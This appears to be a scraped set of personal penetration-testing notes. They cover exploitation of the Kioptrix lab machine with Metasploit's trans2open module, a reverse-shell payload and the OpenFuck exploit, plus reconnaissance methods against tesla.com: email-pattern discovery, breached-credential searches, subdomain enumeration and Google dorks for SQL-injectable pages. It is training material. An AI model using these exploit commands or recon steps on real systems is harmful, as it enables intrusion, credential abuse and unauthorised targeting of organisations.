item.title: Kioptrix
item.description: Metasploit link use exploit/linux/samba/trans2open set rhosts 192.168.215.112 set lhost 192.168.215.151 run But this won’t work. In order this to work, I have to change the payload to stageless payload. set payload linux/x86/shell_reverse_tcp run Manual Exploitation link git clone https://github.com/heltonWernik/OpenLuck.git cd OpenLuck gcc -o OpenFuck OpenFuck.c -lcrypto ./OpenFuck 0x6b 192.168.215.112 443 -c 40 Reference: https://github.com/heltonWernik/OpenLuck.git

item.title: Kioptrix
item.description: Find the Target IP linkarp-scan link arp-scan -l In this case, my target IP address is 192.168.215.112. ping linkLogin to the target machine with john:TwoCows2 credentials. (cheat) ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss -c aes128-cbc john@192.168.215.112 Then ping some random IP to find the source IP which is the target IP. ping 8.8.8.8 netdiscover link sudo netdiscover -r 192.168.215.0/24 Enumeration linkKioptrix walkthrough will not be added here as it is an very easy box and I can find so many detailed walkthroughs from the internet if want.

item.title: Identifying My Target
item.description: Identifing Our Target linkNeed to identify What’s within the SCOPE and What’s not. Example: https://bugcrowd.com/tesla

item.title: Email Hunting
item.description: Discovering Email Addresses linkHunter.io linkhunter.io also can identify the pattern of the email address. In this case it is {f}{last}@tesla.com which means {fist name initial}{last name}@tesla.com If I had an account created, I can see alot more information about the email addresses of the target. Phonebook.cz link Clearbit linkThis is also a fantastic Chrome Extension that allows me to discover email addresses with some other cool details that other tools did not find.

item.title: Credential Hunting
item.description: Dehashed linkThis is a website which costs money but definitely worth it. With this I can browse through all the breached databases and find potential credentials in many ways. Reference: https://dehashed.com/

item.title: Subdomain Hunting
item.description: Sublist3r link sublist3r.py -d tesla.com -o sub.tesla.com.log crt.sh linkWith this website, I can find subdomains of a domain by Certificate Fingerprinting. httprobe linkI can check if all the subdomains that I found ealier are up or not with this tool. cat /opt/Sublist3r/sub.tesla.com.log | httprobe Reference: https://github.com/aboul3la/Sublist3r https://crt.sh/ https://github.com/tomnomnom/httprobe

item.title: Web Technologies
item.description: BuiltWith linkWith this website, I can find what technologies does the target websited utilizes. Wappalyzer linkSimilar to BuiltWith.com, with this website I can find what technologies does the target websited utilizes. Wappalyzer also has browser extensions that comes in handy when it comes to time management. Wappalyzer also considers as active scanning tool according to how the tool gather information from the website Whatweb link whatweb https://book.hacktricks.xyz Reference: https://builtwith.com/ https://www.

item.title: Google Fu
item.description: Filter Domain link site:tesla.com Exclude Keywords link site:tesla.com -shop Filter Filetypes link site:tesla.com filetype:pdf Filter Keywords Within the URL link site:tesla.com inurl:php?id= This way I can find potential SQL injectable websites as well. Reference: https://ahrefs.com/blog/google-advanced-search-operators/
